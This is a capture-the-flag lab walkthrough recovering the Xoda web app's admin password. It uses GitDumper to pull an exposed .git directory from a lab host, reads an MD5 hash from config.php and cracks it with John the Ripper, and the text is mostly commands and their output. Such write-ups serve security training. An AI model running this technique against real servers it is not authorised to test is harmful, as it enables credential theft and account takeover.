#### 1. Exposed Metadata Directory

----

- Rapid development requires that source code modifications be immediately deployed to the servers. If sufficient care is not taken then this can lead to disclosures of private information.
- Objective: Recover the user password for Xoda web app!

----

```sh
root@attackdefense:~# ip addr
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
1366: eth0@if1367: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue state UP group default 
    link/ether 02:42:0a:01:01:03 brd ff:ff:ff:ff:ff:ff link-netnsid 0
    inet 10.1.1.3/24 brd 10.1.1.255 scope global eth0
       valid_lft forever preferred_lft forever
1369: eth1@if1370: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue state UP group default 
    link/ether 02:42:c0:f5:bf:02 brd ff:ff:ff:ff:ff:ff link-netnsid 0
    inet 192.245.191.2/24 brd 192.245.191.255 scope global eth1
       valid_lft forever preferred_lft forever
root@attackdefense:~# 
```

```sh
root@attackdefense:~# ls -l
total 12
-rw-r--r-- 1 root root  293 Feb  7 07:54 README
drwxr-xr-x 1 root root 4096 May 26 16:36 tools
drwxr-xr-x 2 root root 4096 Feb  7 07:54 wordlists
root@attackdefense:~# 
```

```sh
root@attackdefense:~# cd tools/
root@attackdefense:~/tools# ls -l
total 48
drwxr-xr-x 2 root root 4096 Feb  7 07:54 Delorean
drwxr-xr-x 5 root root 4096 May 16 16:38 GitTools
drwxr-xr-x 3 root root 4096 Feb  7 07:54 JohnTheRipper
drwxr-xr-x 5 root root 4096 Apr 28 15:04 exfil
drwxr-xr-x 2 root root 4096 Feb  7 07:54 firepwd
drwxr-xr-x 2 root root 4096 Feb  7 07:54 ircsnapshot
drwxr-xr-x 2 root root 4096 Feb  7 07:54 known_hosts-hashcat
drwxr-xr-x 2 root root 4096 May 14 10:12 portable
drwxr-xr-x 2 root root 4096 Feb  7 07:54 reGeorg
drwxr-xr-x 3 root root 4096 Feb  7 07:54 scripts
drwxr-xr-x 1 root root 4096 May 26 16:57 srtp-decrypt
drwxr-xr-x 2 root root 4096 Feb  7 07:54 steganography
root@attackdefense:~/tools# 
```

```sh
root@attackdefense:~/tools# GitTools/Dumper/gitdumper.sh 192.245.191.3/.git/ .
###########
# GitDumper is part of https://github.com/internetwache/GitTools
#
# Developed and maintained by @gehaxelt from @internetwache
#
# Use at your own risk. Usage might be illegal in certain circumstances. 
# Only for educational purposes!
###########


[*] Destination folder does not exist
[+] Creating ./.git/
[+] Downloaded: HEAD
[-] Downloaded: objects/info/packs
[+] Downloaded: description
[+] Downloaded: config
[-] Downloaded: COMMIT_EDITMSG
[+] Downloaded: index
[+] Downloaded: packed-refs
[+] Downloaded: refs/heads/master
[+] Downloaded: refs/remotes/origin/HEAD
[-] Downloaded: refs/stash
[+] Downloaded: logs/HEAD
[+] Downloaded: logs/refs/heads/master
[+] Downloaded: logs/refs/remotes/origin/HEAD
[-] Downloaded: info/refs
[+] Downloaded: info/exclude
[+] Downloaded: objects/96/c93affe7946edce05a5ceec13ac480d8750af3
[-] Downloaded: objects/00/00000000000000000000000000000000000000
[+] Downloaded: objects/12/f1a631d6cb7bc1641c0d524576e0097022d10e
[+] Downloaded: objects/56/5f2ed410d8c428fb18b819b2dc4fc28edec2a9
[+] Downloaded: objects/cf/0199752e369ef60a4550b19c28917739f48106
[+] Downloaded: objects/fd/520d6e4c6d5fee062022151b266d1c0f594e68
[+] Downloaded: objects/4d/604a50a13e6e3257e790cd5ade5d4145ddef9b
[+] Downloaded: objects/c1/7915140cbbbd51de0a4014be7d35524e875b7d
[+] Downloaded: objects/45/71c617c96213b0e55174f0275d51dffdb8fd66
[+] Downloaded: objects/22/282a30f965e7b129c5b83d0f94f40eb01565b1
[+] Downloaded: objects/f5/db7d6a87e127c34a1b36465fc1f67683f6d3d6
[+] Downloaded: objects/ef/a6c50af07955cdd4f4e374db95a67de7d7ad24
[+] Downloaded: objects/25/bccb2b6b91d5f835387595aadac3732af0e16f
[+] Downloaded: objects/fa/c4647e03c1c4a9b47125a92c25ee3cadaf7e38
[+] Downloaded: objects/f1/9caeade2ba4517bd0aee9a7ba200f54301a758
[+] Downloaded: objects/cd/100431d81cd33727446f615065c2cbb74e15d3
[+] Downloaded: objects/c8/bd25903d8b637cc9268a4d148e7a7c19323e5e
[+] Downloaded: objects/6d/b18b4ef1192024c6058a22f04a01ff2a4c2ce2
[+] Downloaded: objects/eb/e7c1d4b8dc45d3226f22ed25240cd7a096a8ae
[+] Downloaded: objects/5d/12ddd67b3b1439a56113a8b84fecbdbebc1a74
[+] Downloaded: objects/e3/8659fbd2bc02a06a0088da5e7b885e6ec77105
[+] Downloaded: objects/c2/8b829ef2c5157ea0f22f6f75d7f63e30eea762
[+] Downloaded: objects/73/ce1ca4f9ea9a658968afc3c4aa2d66e0f673ec
[+] Downloaded: objects/88/5ab6e950cc549a4bfe194990d42788db6e380c
[+] Downloaded: objects/f3/df55ab7bc50196943525fe4f7115f60751a378
[+] Downloaded: objects/6a/afe7fb4d597cf943fc8df19f20a605667430b5
[+] Downloaded: objects/98/9cb684efad969c6303146512c97d13da080b0c
[+] Downloaded: objects/56/7766816e30bdb4082d81f0ab6271b6d7ab6ce2
[+] Downloaded: objects/94/096782e8f818e22cf53ac6b9a5b78ed4eecc5a
[+] Downloaded: objects/ea/f2363519fa1a98e7bbf97659d5f68ad9ed6e82
[+] Downloaded: objects/dd/b4a4e1bcbcca03767e4d4f03eb1903378f25fa
[+] Downloaded: objects/2f/2d56dd0daa50ce01f0f3568cd39a171b57e14c
[+] Downloaded: objects/9c/628ce789f981abc0247fca01fcbbf6d94ff7f6
[+] Downloaded: objects/d6/5439afbc6cbff4104827835871a797d4f6cb56
[+] Downloaded: objects/c6/42127abc1e76ccf90fe698481fc1cb3a1e05da
[+] Downloaded: objects/f5/1a29a8549251762bc840276a8d2280dbc5db1b
[+] Downloaded: objects/8b/095bfcbafbf5e48147b79ea8484d47fff66825
[+] Downloaded: objects/f6/b4548e36badd50d637407b3bb181123b6c4c9c
[+] Downloaded: objects/63/906485154ac03eadd68e9559a9e5efb19f9285
[+] Downloaded: objects/8f/07172448528411aab356297904d6c146b135f1
[+] Downloaded: objects/21/4cd3b9ed112305703846021bd8cd5dbadc8028
[+] Downloaded: objects/69/c9551f2cdfefd86027c7edfc162a71c2c4d294
[+] Downloaded: objects/c1/8df24f94c324e288b3c937c8e83f90fc7ae9ce
[+] Downloaded: objects/d5/88f422f76405453134a241d93128b8816d85e6
[+] Downloaded: objects/34/f6b38c9c839b55083d92cd2e06587d277f2faf
[+] Downloaded: objects/6b/2545a5a31915b051147d705e8ae6563b08b8cd
[+] Downloaded: objects/a8/8fcf934fa0fcd44e204bc89342cac11f234de1
root@attackdefense:~/tools# 
```

```sh
root@attackdefense:~/tools# GitTools/Extractor/extractor.sh ./ gitdump
###########
# Extractor is part of https://github.com/internetwache/GitTools
#
# Developed and maintained by @gehaxelt from @internetwache
#
# Use at your own risk. Usage might be illegal in certain circumstances. 
# Only for educational purposes!
###########
[*] Destination folder does not exist
[*] Creating...
[+] Found commit: 96c93affe7946edce05a5ceec13ac480d8750af3
[+] Found file: /root/tools/gitdump/0-96c93affe7946edce05a5ceec13ac480d8750af3/README
[+] Found file: /root/tools/gitdump/0-96c93affe7946edce05a5ceec13ac480d8750af3/config.php
[+] Found file: /root/tools/gitdump/0-96c93affe7946edce05a5ceec13ac480d8750af3/functions.php
[+] Found file: /root/tools/gitdump/0-96c93affe7946edce05a5ceec13ac480d8750af3/index.php
[+] Found folder: /root/tools/gitdump/0-96c93affe7946edce05a5ceec13ac480d8750af3/js
[+] Found file: /root/tools/gitdump/0-96c93affe7946edce05a5ceec13ac480d8750af3/js/sorttable.js
[+] Found file: /root/tools/gitdump/0-96c93affe7946edce05a5ceec13ac480d8750af3/js/xoda.js
[+] Found file: /root/tools/gitdump/0-96c93affe7946edce05a5ceec13ac480d8750af3/mobile.css
[+] Found file: /root/tools/gitdump/0-96c93affe7946edce05a5ceec13ac480d8750af3/style.css
[+] Found folder: /root/tools/gitdump/0-96c93affe7946edce05a5ceec13ac480d8750af3/xd_icons
[+] Found file: /root/tools/gitdump/0-96c93affe7946edce05a5ceec13ac480d8750af3/xd_icons/accdb.png
[+] Found file: /root/tools/gitdump/0-96c93affe7946edce05a5ceec13ac480d8750af3/xd_icons/ai.png
[+] Found file: /root/tools/gitdump/0-96c93affe7946edce05a5ceec13ac480d8750af3/xd_icons/avi.png
[+] Found file: /root/tools/gitdump/0-96c93affe7946edce05a5ceec13ac480d8750af3/xd_icons/bdf.png
[+] Found file: /root/tools/gitdump/0-96c93affe7946edce05a5ceec13ac480d8750af3/xd_icons/bz2.png
[+] Found file: /root/tools/gitdump/0-96c93affe7946edce05a5ceec13ac480d8750af3/xd_icons/c.png
[+] Found file: /root/tools/gitdump/0-96c93affe7946edce05a5ceec13ac480d8750af3/xd_icons/dir.png
[+] Found file: /root/tools/gitdump/0-96c93affe7946edce05a5ceec13ac480d8750af3/xd_icons/doc.png
[+] Found file: /root/tools/gitdump/0-96c93affe7946edce05a5ceec13ac480d8750af3/xd_icons/docm.png
[+] Found file: /root/tools/gitdump/0-96c93affe7946edce05a5ceec13ac480d8750af3/xd_icons/docx.png
[+] Found file: /root/tools/gitdump/0-96c93affe7946edce05a5ceec13ac480d8750af3/xd_icons/flac.png
[+] Found file: /root/tools/gitdump/0-96c93affe7946edce05a5ceec13ac480d8750af3/xd_icons/gif.png
[+] Found file: /root/tools/gitdump/0-96c93affe7946edce05a5ceec13ac480d8750af3/xd_icons/gz.png
[+] Found file: /root/tools/gitdump/0-96c93affe7946edce05a5ceec13ac480d8750af3/xd_icons/h.png
[+] Found file: /root/tools/gitdump/0-96c93affe7946edce05a5ceec13ac480d8750af3/xd_icons/htm.png
[+] Found file: /root/tools/gitdump/0-96c93affe7946edce05a5ceec13ac480d8750af3/xd_icons/html.png
[+] Found file: /root/tools/gitdump/0-96c93affe7946edce05a5ceec13ac480d8750af3/xd_icons/img.png
[+] Found file: /root/tools/gitdump/0-96c93affe7946edce05a5ceec13ac480d8750af3/xd_icons/iso.png
[+] Found file: /root/tools/gitdump/0-96c93affe7946edce05a5ceec13ac480d8750af3/xd_icons/jpeg.png
[+] Found file: /root/tools/gitdump/0-96c93affe7946edce05a5ceec13ac480d8750af3/xd_icons/jpg.png
[+] Found file: /root/tools/gitdump/0-96c93affe7946edce05a5ceec13ac480d8750af3/xd_icons/mat.png
[+] Found file: /root/tools/gitdump/0-96c93affe7946edce05a5ceec13ac480d8750af3/xd_icons/mda.png
[+] Found file: /root/tools/gitdump/0-96c93affe7946edce05a5ceec13ac480d8750af3/xd_icons/mdb.png
[+] Found file: /root/tools/gitdump/0-96c93affe7946edce05a5ceec13ac480d8750af3/xd_icons/mid.png
[+] Found file: /root/tools/gitdump/0-96c93affe7946edce05a5ceec13ac480d8750af3/xd_icons/midi.png
[+] Found file: /root/tools/gitdump/0-96c93affe7946edce05a5ceec13ac480d8750af3/xd_icons/mo.png
[+] Found file: /root/tools/gitdump/0-96c93affe7946edce05a5ceec13ac480d8750af3/xd_icons/mov.png
[+] Found file: /root/tools/gitdump/0-96c93affe7946edce05a5ceec13ac480d8750af3/xd_icons/mp3.png
[+] Found file: /root/tools/gitdump/0-96c93affe7946edce05a5ceec13ac480d8750af3/xd_icons/mp4.png
[+] Found file: /root/tools/gitdump/0-96c93affe7946edce05a5ceec13ac480d8750af3/xd_icons/mpeg.png
[+] Found file: /root/tools/gitdump/0-96c93affe7946edce05a5ceec13ac480d8750af3/xd_icons/mpg.png
[+] Found file: /root/tools/gitdump/0-96c93affe7946edce05a5ceec13ac480d8750af3/xd_icons/odb.png
[+] Found file: /root/tools/gitdump/0-96c93affe7946edce05a5ceec13ac480d8750af3/xd_icons/odf.png
[+] Found file: /root/tools/gitdump/0-96c93affe7946edce05a5ceec13ac480d8750af3/xd_icons/odg.png
[+] Found file: /root/tools/gitdump/0-96c93affe7946edce05a5ceec13ac480d8750af3/xd_icons/odp.png
[+] Found file: /root/tools/gitdump/0-96c93affe7946edce05a5ceec13ac480d8750af3/xd_icons/ods.png
[+] Found file: /root/tools/gitdump/0-96c93affe7946edce05a5ceec13ac480d8750af3/xd_icons/odt.png
[+] Found file: /root/tools/gitdump/0-96c93affe7946edce05a5ceec13ac480d8750af3/xd_icons/ogg.png
[+] Found file: /root/tools/gitdump/0-96c93affe7946edce05a5ceec13ac480d8750af3/xd_icons/pdf.png
[+] Found file: /root/tools/gitdump/0-96c93affe7946edce05a5ceec13ac480d8750af3/xd_icons/php.png
[+] Found file: /root/tools/gitdump/0-96c93affe7946edce05a5ceec13ac480d8750af3/xd_icons/php3.png
[+] Found file: /root/tools/gitdump/0-96c93affe7946edce05a5ceec13ac480d8750af3/xd_icons/php4.png
[+] Found file: /root/tools/gitdump/0-96c93affe7946edce05a5ceec13ac480d8750af3/xd_icons/php5.png
[+] Found file: /root/tools/gitdump/0-96c93affe7946edce05a5ceec13ac480d8750af3/xd_icons/png.png
[+] Found file: /root/tools/gitdump/0-96c93affe7946edce05a5ceec13ac480d8750af3/xd_icons/ppt.png
[+] Found file: /root/tools/gitdump/0-96c93affe7946edce05a5ceec13ac480d8750af3/xd_icons/pptx.png
[+] Found file: /root/tools/gitdump/0-96c93affe7946edce05a5ceec13ac480d8750af3/xd_icons/psd.png
[+] Found file: /root/tools/gitdump/0-96c93affe7946edce05a5ceec13ac480d8750af3/xd_icons/sh.png
[+] Found file: /root/tools/gitdump/0-96c93affe7946edce05a5ceec13ac480d8750af3/xd_icons/sql.png
[+] Found file: /root/tools/gitdump/0-96c93affe7946edce05a5ceec13ac480d8750af3/xd_icons/sxc.png
[+] Found file: /root/tools/gitdump/0-96c93affe7946edce05a5ceec13ac480d8750af3/xd_icons/sxd.png
[+] Found file: /root/tools/gitdump/0-96c93affe7946edce05a5ceec13ac480d8750af3/xd_icons/sxi.png
[+] Found file: /root/tools/gitdump/0-96c93affe7946edce05a5ceec13ac480d8750af3/xd_icons/sxm.png
[+] Found file: /root/tools/gitdump/0-96c93affe7946edce05a5ceec13ac480d8750af3/xd_icons/sxw.png
[+] Found file: /root/tools/gitdump/0-96c93affe7946edce05a5ceec13ac480d8750af3/xd_icons/tar.png
[+] Found file: /root/tools/gitdump/0-96c93affe7946edce05a5ceec13ac480d8750af3/xd_icons/ttf.png
[+] Found file: /root/tools/gitdump/0-96c93affe7946edce05a5ceec13ac480d8750af3/xd_icons/txt.png
[+] Found file: /root/tools/gitdump/0-96c93affe7946edce05a5ceec13ac480d8750af3/xd_icons/unknown.png
[+] Found file: /root/tools/gitdump/0-96c93affe7946edce05a5ceec13ac480d8750af3/xd_icons/wav.png
[+] Found file: /root/tools/gitdump/0-96c93affe7946edce05a5ceec13ac480d8750af3/xd_icons/xls.png
[+] Found file: /root/tools/gitdump/0-96c93affe7946edce05a5ceec13ac480d8750af3/xd_icons/xlsx.png
[+] Found file: /root/tools/gitdump/0-96c93affe7946edce05a5ceec13ac480d8750af3/xd_icons/zip.png
[+] Found file: /root/tools/gitdump/0-96c93affe7946edce05a5ceec13ac480d8750af3/zipstream.php
root@attackdefense:~/tools# 
```

```sh
root@attackdefense:~/tools# cd gitdump/
root@attackdefense:~/tools/gitdump# 
root@attackdefense:~/tools/gitdump# ls -lah
total 12K
drwxr-xr-x 3 root root 4.0K Jul 29 02:32 .
drwxr-xr-x 1 root root 4.0K Jul 29 02:32 ..
drwxr-xr-x 4 root root 4.0K Jul 29 02:32 0-96c93affe7946edce05a5ceec13ac480d8750af3
root@attackdefense:~/tools/gitdump# 
root@attackdefense:~/tools/gitdump# cd 0-96c93affe7946edce05a5ceec13ac480d8750af3/
root@attackdefense:~/tools/gitdump/0-96c93affe7946edce05a5ceec13ac480d8750af3# tree
.
|-- README
|-- commit-meta.txt
|-- config.php
|-- functions.php
|-- index.php
|-- js
|   |-- sorttable.js
|   `-- xoda.js
|-- mobile.css
|-- style.css
|-- xd_icons
|   |-- accdb.png
|   |-- ai.png
|   |-- avi.png
|   |-- bdf.png
|   |-- bz2.png
|   |-- c.png
|   |-- dir.png
|   |-- doc.png
|   |-- docm.png
|   |-- docx.png
|   |-- flac.png
|   |-- gif.png
|   |-- gz.png
|   |-- h.png
|   |-- htm.png
|   |-- html.png
|   |-- img.png
|   |-- iso.png
|   |-- jpeg.png
|   |-- jpg.png
|   |-- mat.png
|   |-- mda.png
|   |-- mdb.png
|   |-- mid.png
|   |-- midi.png
|   |-- mo.png
|   |-- mov.png
|   |-- mp3.png
|   |-- mp4.png
|   |-- mpeg.png
|   |-- mpg.png
|   |-- odb.png
|   |-- odf.png
|   |-- odg.png
|   |-- odp.png
|   |-- ods.png
|   |-- odt.png
|   |-- ogg.png
|   |-- pdf.png
|   |-- php.png
|   |-- php3.png
|   |-- php4.png
|   |-- php5.png
|   |-- png.png
|   |-- ppt.png
|   |-- pptx.png
|   |-- psd.png
|   |-- sh.png
|   |-- sql.png
|   |-- sxc.png
|   |-- sxd.png
|   |-- sxi.png
|   |-- sxm.png
|   |-- sxw.png
|   |-- tar.png
|   |-- ttf.png
|   |-- txt.png
|   |-- unknown.png
|   |-- wav.png
|   |-- xls.png
|   |-- xlsx.png
|   `-- zip.png
`-- zipstream.php

2 directories, 72 files
root@attackdefense:~/tools/gitdump/0-96c93affe7946edce05a5ceec13ac480d8750af3# 
```

```sh
root@attackdefense:~/tools/gitdump/0-96c93affe7946edce05a5ceec13ac480d8750af3# cat config.php 
<?php
$_users = array (
  'admin' => 
  array (
    'password' => '143585abf6fcc8c2f0d8d2fb64dab4cf',
    'privileges' => '1',
  ),
);
define('ROOT_DIR', 'files/');
define('META_DIR', '.xoda/');
define('ANONYMOUS', '');
define('EDITABLE', 'html htm txt js css php tex');
define('IMG_EXTENSIONS', 'jpg jpeg png gif');
define('IMG_WIDTH', '150');
define('ICONS_DIR', 'xd_icons/');
define('SHOW_FILESIZE', '1');
define('TABLE_COLUMNS', 'description mtime size');
define('FILTERS', '1');
define('SEARCH', '1');
define('SHOW_HIDDEN', '');
define('VERSIONING', '1');
define('SERVER_AUTH', '1');
define('UNIX_FILEINFO_TYPE', '1');
define('TITLE', 'XODA');
define('DATE_FORMAT', 'm/d/Y h:i:s a');
define('TIMEZONE', 'America/New_York');
define('LABEL_EDIT', '&oplus;');
define('LABEL_DELETE', '&otimes;');
define('LABEL_DOWNLOAD', '&dArr;');
define('LABEL_UP_DIR', '&uArr; (up)');
$_top_content = '<span style="color: #56a;">XO</span><span style="color: #fa5;">D</span><span style="color: #56a;">A</span>';
$_colors = array (
  '#ddeeff' => '#0000cc',
  '#eeeeff' => '#2266ff',
  '#eeddff' => '#5533bb',
  '#ffeeff' => '#885566',
  '#ffeedd' => '#ee7700',
  '#ffddaa' => '#aa6600',
  '#ffffdd' => '#666633',
  '#ffffee' => '#669922',
  '#eeffee' => '#006633',
  'inherit' => 'inherit',
);
?>
root@attackdefense:~/tools/gitdump/0-96c93affe7946edce05a5ceec13ac480d8750af3# 
```

```sh
root@attackdefense:~# echo "143585abf6fcc8c2f0d8d2fb64dab4cf" > hash
root@attackdefense:~# 
```

```sh
root@attackdefense:~# john --format=Raw-MD5 --wordlist=/root/wordlists/100-common-passwords.txt hash 
Created directory: /root/.john
Using default input encoding: UTF-8
Loaded 1 password hash (Raw-MD5 [MD5 256/256 AVX2 8x3])
Warning: no OpenMP support for this hash type, consider --fork=20
Press 'q' or Ctrl-C to abort, almost any other key for status
madalina         (?)
1g 0:00:00:00 DONE (2019-07-29 02:36) 50.00g/s 5000p/s 5000c/s 5000C/s 242424..vagrant
Use the "--show --format=Raw-MD5" options to display all of the cracked passwords reliably
Session completed
root@attackdefense:~# 
```

----

###### Reference

- [`GitTools`](https://github.com/internetwache/GitTools)

----

EOF